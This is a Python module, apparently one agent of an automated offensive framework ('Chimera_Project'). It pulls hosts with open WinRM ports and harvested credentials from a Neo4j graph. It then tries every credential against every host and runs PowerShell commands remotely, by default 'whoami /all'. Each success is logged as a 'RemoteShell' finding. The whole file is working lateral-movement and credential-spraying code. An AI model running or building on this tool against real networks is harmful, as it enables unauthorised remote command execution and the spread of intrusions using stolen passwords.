import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import logging
import winrm

# Ensure the agent can find the core directory for imports
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class WinRM_Commander:
    def __init__(self):
        self.agent_id = "19"
        self.name = "WinRM_Commander"
        self.base_dir = "/home/dan/Chimera_Project/agents/WinRM_Commander"
        
        # Setup Logging
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(
            filename=log_path,
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(self.name)
        self.logger.addHandler(logging.StreamHandler())
        
        self.db = ChimeraDB()

    def execute_command(self, target_ip, username, password, command="whoami /all"):
        """
        Attempts to connect via WinRM and execute a PowerShell command.
        """
        self.logger.info(f"Attempting WinRM connection to {target_ip} as {username}...")
        self.db.heartbeat(self.name)

        try:
            # Protocol 5985 is HTTP (standard for internal labs)
            session = winrm.Session(f'http://{target_ip}:5985/wsman', auth=(username, password), transport='ntlm')
            
            # Execute command in PowerShell
            result = session.run_ps(command)
            
            if result.status_code == 0:
                output = result.std_out.decode().strip()
                self.logger.info(f"[!!!] WinRM SUCCESS on {target_ip}")
                self.logger.info(f"Result: {output}")
                
                finding_data = {
                    "ip": target_ip,
                    "username": username,
                    "command": command,
                    "output": output,
                    "status": "Remote Execution Successful"
                }
                self.db.report_finding(self.name, "RemoteShell", finding_data)
                return True
            else:
                self.logger.info(f"[-] WinRM Auth successful, but command failed: {result.std_err.decode()}")
                return False

        except Exception as e:
            self.logger.error(f"WinRM Error on {target_ip}: {e}")
            return False

    def get_targets(self):
        """
        Queries Neo4j for Hosts with WinRM (Port 5985/5986) open and known creds.
        """
        query = """
        MATCH (h:Host)-[:HAS_PORT]->(p:Port)
        WHERE p.port IN [5985, 5986]
        MATCH (u:User)-[:OWNS_CRED]->(c:Credential)
        RETURN h.ip AS ip, u.name AS user, c.secret AS password
        """
        targets = []
        with self.db.driver.session() as session:
            result = session.run(query)
            for record in result:
                targets.append({
                    "ip": record["ip"],
                    "user": record["user"],
                    "pass": record["password"]
                })
        return targets

    def run(self):
        self.logger.info(f"{self.name} checking graph for targets...")
        targets = self.get_targets()
        
        if not targets:
            self.logger.info("No WinRM targets with credentials found in graph.")
            return

        for target in targets:
            # Run an initial 'whoami' to verify access
            self.execute_command(target["ip"], target["user"], target["pass"])
            
        self.db.close()

if __name__ == "__main__":
    agent = WinRM_Commander()
    agent.run()
